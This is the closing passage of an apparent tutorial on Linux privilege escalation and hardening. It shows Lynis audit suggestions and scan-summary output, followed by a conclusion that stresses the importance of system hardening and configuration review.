  * Run pwck manually <span class="hljs-keyword">and</span> correct <span class="hljs-keyword">any</span> errors <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> password <span class="hljs-built_in">file</span> [AUTH<span class="hljs-number">-9228</span>] 
      <span class="hljs-keyword">https</span>://cisofy.com/lynis/controls/AUTH<span class="hljs-number">-9228</span>/

  * Configure minimum encryption algorithm rounds <span class="hljs-keyword">in</span> /etc/login.defs [AUTH<span class="hljs-number">-9230</span>] 
      <span class="hljs-keyword">https</span>://cisofy.com/lynis/controls/AUTH<span class="hljs-number">-9230</span>/
</code></pre>
<p>and an overal scan details section:</p>
<p>Linux Hardening</p>
<pre><code class="lang-shell-session">Lynis security scan details:

  Hardening index : 60 [############        ]
  Tests performed : 256
  Plugins enabled : 2

  Components:
  -<span class="ruby"> Firewall               [X]
</span>  -<span class="ruby"> Malware scanner        [X]
</span>
  Scan mode:
  Normal [ ]  Forensics [ ]  Integration [ ]  Pentest [V] (running non-privileged)

  Lynis modules:
  -<span class="ruby"> Compliance status      [?]
</span>  -<span class="ruby"> Security audit         [V]
</span>  -<span class="ruby"> Vulnerability scan     [V]
</span>
  Files:
  -<span class="ruby"> Test <span class="hljs-keyword">and</span> debug information      : <span class="hljs-regexp">/home/mrb</span>3n/lynis.log
</span>  -<span class="ruby"> Report data                     : <span class="hljs-regexp">/home/mrb</span>3n/lynis-report.dat</span>
</code></pre>
<p>The tool is useful for informing privilege escalation paths and performing a quick configuration check and will perform even more checks if run as the root user.</p>
<hr>
<h3 id="conclusion">Conclusion</h3>
<p>As we have seen, there are various ways to escalate privileges on Linux/Unix systems - from simple misconfigurations and public exploits for known vulnerable services to exploit development based on custom libraries. Once root access is obtained, it becomes easier to use it as a pivot point for further network exploitation. Linux (and all system) hardening is critical for organizations of all sizes. Best practice guidelines and controls exist in many different forms. Reviews should include a mix of hands-on manual testing and review and automated configuration scanning and validation of the results.</p>
